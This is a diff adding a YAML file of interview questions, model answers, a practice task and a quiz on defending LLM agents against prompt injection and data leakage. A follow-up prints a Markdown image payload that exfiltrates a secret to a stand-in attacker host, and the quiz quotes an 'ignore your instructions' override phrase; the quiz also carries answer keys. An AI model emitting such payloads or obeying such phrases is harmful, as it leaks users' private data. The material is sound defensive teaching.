@@ -1,0 +1,73 @@
+questions:
+  - q: What is prompt injection, and how would you defend against it?
+    think: Direct vs indirect, then why no single defence works, then layers.
+    answer: |
+      It is text that causes a model to follow instructions it shouldn't. In direct injection the user types it. In indirect injection it's hidden in something the model reads, such as a document or a web page, which is worse because the victim did nothing wrong.
+
+      It has no complete fix, because a model receives instructions and data in one stream, with nothing like a parameterised query to separate them. So I assume it will sometimes work and limit the damage: least privilege with the user's own permissions, a tool gate in code with allowlists and argument checks, human approval for risky actions, and treating output as untrusted, including URL allowlists and escaping. On top of that, I'd use input classifiers and careful prompts to lower the odds, and keep attack cases in the eval suite.
+    askedAt:
+      - company: Google
+        year: 2026
+        round: Role-related knowledge, Cloud AI engineer
+        source: https://leetcode.com/discuss/post/8583957/recent-google-interview-experience-for-g-gkmp/
+  - q: How do you make sure sensitive or personal information isn't sent to, or returned from, the model?
+    think: Before the prompt, in the retrieval, after the answer, and in logs.
+    answer: |
+      Minimise first: send only the fields the task needs, and get them through a query scoped to the current user, so other people's data can't enter the prompt. Detect and mask personal data such as emails and card numbers before the call, and map masked tokens back afterwards if the answer needs them.
+
+      Enforce access in retrieval filters, not in instructions. On output, scan for secrets and personal data, and allow only expected formats. Don't forget the surrounding systems: redact logs and traces, set retention limits, and check the provider's data handling and retention terms against your compliance needs.
+    askedAt:
+      - company: Amazon
+        year: 2026
+        round: GenAI round
+        source: https://leetcode.com/discuss/post/8542502/software-development-engineer-i-amazon-i-tusz/
+  - q: Design the permissions for an agent that can read a user's email and send replies.
+    think: This agent has all three parts of the trifecta.
+    answer: |
+      It has private data, untrusted content (every incoming email), and a way out, so one crafted email could exfiltrate the inbox. The agent runs with that user's OAuth token, scoped to mail only, so it can't exceed the user's rights.
+
+      A gate in code tracks that untrusted text has entered the session. After that, sending requires explicit user approval showing the exact recipients and body. Replies are limited to people already on the thread; a new external recipient needs a separate confirmation. Links in generated text are restricted and images aren't rendered. Reading and drafting work without approval, so the feature stays useful. Every tool call is logged, and denied ones raise an alert.
+  - q: Why can't you just tell the model to ignore instructions found in documents?
+    think: What enforces that?
+    answer: |
+      It helps, but only as a statistical nudge. The instruction and the attack are both just text in the same input, and nothing enforces the boundary. An attacker can phrase things in many ways, in other languages or encodings, and only needs one to work. So it's a useful layer that lowers the rate, and it can't be the only one. Anything that must never happen has to be blocked by code outside the model.
+followUps:
+  - q: Is a leaked system prompt a serious problem?
+    intuition: What should never have been in it?
+    approach: |
+      Only if you put something sensitive there. Assume it can be extracted. It should contain no credentials, connection strings or authorisation rules that security depends on. Leaking it might reveal business logic or help attackers craft attacks, but it should never directly compromise anything.
+  - q: How can rendering Markdown leak data?
+    intuition: What does a browser do with an image?
+    approach: |
+      A browser fetches images automatically. If an injected instruction makes the model output `![x](https://evil.example/?d=<secret>)`, the secret is in the URL and reaches the attacker's server as soon as it's displayed, with no click. Fix it by allowing only known image hosts, stripping unknown URLs, or not rendering images at all.
+  - q: Do guardrails add a lot of latency?
+    intuition: Which checks can run alongside the model?
+    approach: |
+      Code checks take microseconds. Classifier or LLM checks can add 100 ms or more, so run them in parallel with the main call where you can, and cancel the main call if the check fails. Use small, fast models for checks. For streamed output, check sentence by sentence and hold back links and images until the end.
+  - q: Does fine-tuning a model against attacks solve prompt injection?
+    intuition: Does training give you a guarantee?
+    approach: |
+      No. Safety training and instruction hierarchies raise the difficulty, but it's still a probability and attackers adapt. OWASP notes that fine-tuning and RAG don't fully mitigate it. Use it as one more layer on top of hard limits in code.
+practice:
+  - task: 'Write a tool gate for an agent: deny tools outside an allowlist, ask a human for writes after untrusted content, and deny sending data out when both untrusted content and private data have been seen.'
+    hint: Keep two booleans on the session. Reading private data sets one, and receiving outside content sets the other.
+    solution: |
+      Check the allowlist first. Reads are allowed, and a private read sets `sawPrivate`. Each tool result an outsider could influence calls `recordUntrustedContent`. Writes need approval once the session is tainted. Sending out is denied when both flags are set, needs approval when only tainted, and is otherwise allowed. Because this logic never looks at the model's reasoning, a persuasive injection has nothing to persuade.
+    solutionCode: guard-tool-gate
+quiz:
+  - q: Which is an indirect prompt injection?
+    options: ['A user types "ignore your instructions"', 'A web page the agent reads contains hidden instructions', 'A user asks an off-topic question', 'A model hallucinates a fact']
+    correct: 1
+    why: 'Indirect injection arrives through content the model reads, not from the person using it.'
+  - q: Which control still works if the model has been completely fooled?
+    options: ['A system prompt saying "never reveal data"', 'An attack-detection classifier', 'A tool allowlist and per-user permissions enforced in code', 'A longer system prompt']
+    correct: 2
+    why: 'Code outside the model doesn''t depend on the model''s judgement.'
+  - q: An agent reads public web pages and can send emails, but has no access to private data. Is that the lethal trifecta?
+    options: ['Yes', 'No, since one leg is missing, though it can still be abused to send spam', 'Only if it uses RAG', 'Only with Markdown']
+    correct: 1
+    why: 'With no private data there is nothing to steal, but untrusted content driving an outbound action is still a risk to control.'
+  - q: Why is a 95% detection rate not enough for a prompt-injection filter?
+    options: ['It is too slow', 'Attackers can retry until one attempt gets through', 'It costs too much', 'It only works in English']
+    correct: 1
+    why: 'A security boundary has to hold against repeated, adaptive attempts.'
